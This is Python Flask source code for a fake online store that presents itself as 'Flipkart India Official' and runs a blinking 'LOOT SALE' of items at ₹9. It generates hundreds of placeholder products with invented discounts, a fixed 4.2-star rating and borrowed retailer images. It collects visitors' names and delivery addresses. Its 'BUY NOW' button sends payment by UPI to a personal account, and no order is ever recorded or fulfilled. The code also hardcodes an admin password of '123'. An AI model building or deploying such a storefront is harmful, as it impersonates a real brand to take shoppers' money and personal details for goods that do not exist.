from flask import Flask, render_template_string, request, session, redirect, url_for
import json
import os
import random

app = Flask(__name__)
app.secret_key = 'flipkart_mega_pro_2026_v25'

# ==========================================
# 1. SETTINGS & SECURITY
# ==========================================
DB_FILE = "products.json"
MY_UPI_ID = "9653314458@naviaxis"
MY_NAME = "Apni Dukaan"
OWNER_PASSWORD = "123" 
SECRET_PATH = "/master-control-panel-786"

def load_data():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return []

def save_data(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

# --- 500+ BUDGET & LOOT ITEMS GENERATOR ---
def seed_inventory():
    if not load_data():
        all_items = []
        
        # CATEGORY ASSETS (Safe & Fast Links)
        rob_imgs = ["https://m.media-amazon.com/images/I/61+A+B+C+DL._SX679_.jpg", "https://m.media-amazon.com/images/I/61pInh+6fVL._SX679_.jpg", "https://m.media-amazon.com/images/I/51r-J1Y2+ZL._SX679_.jpg"]
        fas_imgs = ["https://m.media-amazon.com/images/I/91J-Wd8kH+L._UY879_.jpg", "https://m.media-amazon.com/images/I/71k+p+q+r+sL._UY879_.jpg", "https://m.media-amazon.com/images/I/81I+r97v28L._UY879_.jpg"]
        spo_imgs = ["https://rukminim2.flixcart.com/image/416/416/xif0q/bat/q/t/y/1-plastic-cricket-bat-for-kids-plastic-cricket-bat-full-size-original-imagpyz5a5z5z5ze.jpeg", "https://m.media-amazon.com/images/I/61+w+e+r+tL._UY695_.jpg"]

        # 1. Loot Items (₹9 - ₹29) - 50 Items
        for i in range(50):
            all_items.append({"id": len(all_items)+1, "name": f"Loot Gadget v{i}", "price": random.choice([9, 19, 29]), "mrp": 499, "cat": "Loot", "img": random.choice(rob_imgs), "desc": "Special Loot Offer - Limited Stock!", "policy": "No Return."})

        # 2. Robotics (150 Items) - ₹49 - ₹249
        for i in range(150):
            all_items.append({"id": len(all_items)+1, "name": f"Robot Part-{i}", "price": random.choice([49, 99, 149, 249]), "mrp": 599, "cat": "Robotics", "img": random.choice(rob_imgs), "desc": "Best for school projects.", "policy": "7 Days Return."})

        # 3. Fashion (200 Items) - ₹99 - ₹499
        for i in range(200):
            all_items.append({"id": len(all_items)+1, "name": f"Fashion Wear Style-{i}", "price": random.choice([199, 299, 399, 499]), "mrp": 1200, "cat": "Fashion", "img": random.choice(fas_imgs), "desc": "High quality fabric.", "policy": "7 Days Return."})

        # 4. Sports (120 Items) - ₹49 - ₹399
        for i in range(120):
            all_items.append({"id": len(all_items)+1, "name": f"Sports Gear v{i}", "price": random.choice([49, 99, 199, 399]), "mrp": 900, "cat": "Sports", "img": random.choice(spo_imgs), "desc": "Durable and professional.", "policy": "7 Days Return."})
        
        save_data(all_items)

seed_inventory()

# ==========================================
# 2. UI DESIGN (Registration + Store)
# ==========================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart India Official</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --fk-blue: #2874f0; --fk-yellow: #ff9f00; --bg: #f1f3f6; }
        body { background: var(--bg); font-family: sans-serif; padding-bottom: 70px; }
        .navbar { background: var(--fk-blue); color: white; padding: 12px; position: sticky; top: 0; z-index: 1000; }
        .loot-banner { background: linear-gradient(90deg, #ff0000, #ff9f00); color: white; padding: 15px; text-align: center; font-weight: bold; margin: 10px; border-radius: 5px; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px; padding: 4px; }
        .card { background: white; border: 1px solid #ddd; text-decoration: none; color: black; display: flex; flex-direction: column; overflow: hidden; }
        .card img { width: 100%; height: 160px; object-fit: contain; padding: 10px; }
        .footer-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; border-top: 1px solid #ddd; padding: 10px 0; z-index: 1000; }
        .footer-nav a { flex: 1; text-align: center; color: #666; font-size: 11px; text-decoration: none; }
    </style>
</head>
<body>

{% if page == 'register' %}
    <div class="container mt-5">
        <div class="card p-4 shadow-sm border-0">
            <h4 class="text-primary fw-bold text-center">Create Account</h4>
            <p class="text-center small text-muted">Join Flipkart Budget Store</p>
            <form action="/setup_account" method="POST">
                <input name="uname" class="form-control mb-3" placeholder="Full Name" required>
                <input name="uaddr" class="form-control mb-3" placeholder="Delivery Address" required>
                <button class="btn btn-warning w-100 fw-bold">CONTINUE</button>
            </form>
        </div>
    </div>

{% elif page == 'home' %}
    <nav class="navbar">
        <div class="d-flex justify-content-between align-items-center w-100">
            <span class="fw-bold fs-5 italic">Flipkart</span>
            <span class="small"><i class="fas fa-user-circle"></i> {{ session.user.name }}</span>
        </div>
    </nav>

    <a href="/?cat=Loot" style="text-decoration:none;"><div class="loot-banner">🔥 LOOT SALE IS LIVE: ITEMS @ ₹9 🔥</div></a>

    <div class="bg-white p-2 d-flex gap-2 overflow-auto shadow-sm mb-1" style="scrollbar-width:none;">
        <a href="/?cat=all" class="btn btn-sm btn-outline-primary rounded-pill">All</a>
        <a href="/?cat=Loot" class="btn btn-sm btn-outline-danger rounded-pill">Loot</a>
        <a href="/?cat=Robotics" class="btn btn-sm btn-outline-primary rounded-pill">Robotics</a>
        <a href="/?cat=Fashion" class="btn btn-sm btn-outline-primary rounded-pill">Fashion</a>
        <a href="/?cat=Sports" class="btn btn-sm btn-outline-primary rounded-pill">Sports</a>
    </div>

    <div class="grid">
        {% for p in items %}
        <a href="/product/{{ p.id }}" class="card">
            <img src="{{ p.img }}" onerror="this.src='https://via.placeholder.com/150?text=Product'">
            <div class="p-2">
                <div class="small text-truncate">{{ p.name }}</div>
                <div class="fw-bold">₹{{ p.price }} <span class="text-muted text-decoration-line-through small" style="font-size:10px;">₹{{ p.mrp }}</span></div>
            </div>
        </a>
        {% endfor %}
    </div>

{% elif page == 'detail' %}
    <nav class="navbar"><a href="/" class="text-white me-3 text-decoration-none"><i class="fas fa-arrow-left"></i> Back</a></nav>
    <div class="bg-white p-4 text-center border-bottom"><img src="{{ p.img }}" style="max-height:300px; max-width:100%;" onerror="this.src='https://via.placeholder.com/150'"></div>
    <div class="p-3 bg-white">
        <h5 class="fw-bold">{{ p.name }}</h5><div class="badge bg-success mb-2">4.2 ★</div>
        <h2 class="fw-bold text-dark">₹{{ p.price }} <span class="text-muted fs-6 text-decoration-line-through">₹{{ p.mrp }}</span></h2>
        <hr><h6 class="fw-bold">Description</h6><p class="small text-muted">{{ p.desc }}</p>
        <h6 class="fw-bold">Policy</h6><p class="small text-muted">{{ p.policy }}</p>
        <hr><h6 class="fw-bold">Delivery To:</h6><p class="small text-primary fw-bold">{{ session.user.addr }}</p>
    </div>
    <div class="fixed-bottom bg-white d-flex p-2 gap-2"><button class="btn btn-outline-dark w-50 fw-bold">CART</button><a href="/pay/{{ p.id }}" class="btn btn-warning w-50 fw-bold">BUY NOW</a></div>

{% elif page == 'admin_login' %}
    <div class="container mt-5 text-center"><div class="card p-4 shadow-sm mx-auto" style="max-width:350px;">
        <h5 class="fw-bold text-primary">Admin Access</h5>
        <form action="/admin-login-auth" method="POST"><input name="pass" type="password" class="form-control mb-3" placeholder="Secret Password" required><button class="btn btn-primary w-100">Unlock Panel</button></form>
    </div></div>
{% endif %}

<div class="footer-nav">
    <a href="/"><i class="fas fa-home d-block"></i>Home</a>
    <a href="#"><i class="fas fa-th-large d-block"></i>Categories</a>
    <a href="#"><i class="fas fa-shopping-cart d-block"></i>Cart</a>
    <a href="#"><i class="fas fa-user d-block"></i>Account</a>
</div>
</body></html>
"""

# ==========================================
# 3. ROUTES & LOGIC
# ==========================================
@app.before_request
def check_reg():
    if 'user' not in session and request.endpoint not in ['setup_account', 'static']:
        return render_template_string(HTML_TEMPLATE, page='register')

@app.route('/setup_account', methods=['POST'])
def setup_account():
    session['user'] = {'name': request.form.get('uname'), 'addr': request.form.get('uaddr')}
    return redirect('/')

@app.route('/')
def home():
    all_p = load_data()
    cat = request.args.get('cat', 'all')
    items = [p for p in all_p if p['cat'] == cat] if cat != 'all' else all_p
    return render_template_string(HTML_TEMPLATE, page='home', items=items)

@app.route('/product/<int:pid>')
def detail(pid):
    p = next((i for i in load_data() if i['id'] == pid), None)
    return render_template_string(HTML_TEMPLATE, page='detail', p=p)

@app.route(SECRET_PATH)
def admin_login():
    return render_template_string(HTML_TEMPLATE, page='admin_login')

@app.route('/admin-login-auth', methods=['POST'])
def auth():
    if request.form.get('pass') == OWNER_PASSWORD:
        session['admin'] = True
        return "Login Success! Use Admin Tools."
    return "Wrong!"

@app.route('/pay/<int:pid>')
def pay(pid):
    p = next((i for i in load_data() if i['id'] == pid), None)
    return redirect(f"upi://pay?pa={MY_UPI_ID}&pn={MY_NAME}&am={p['price']}&cu=INR")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
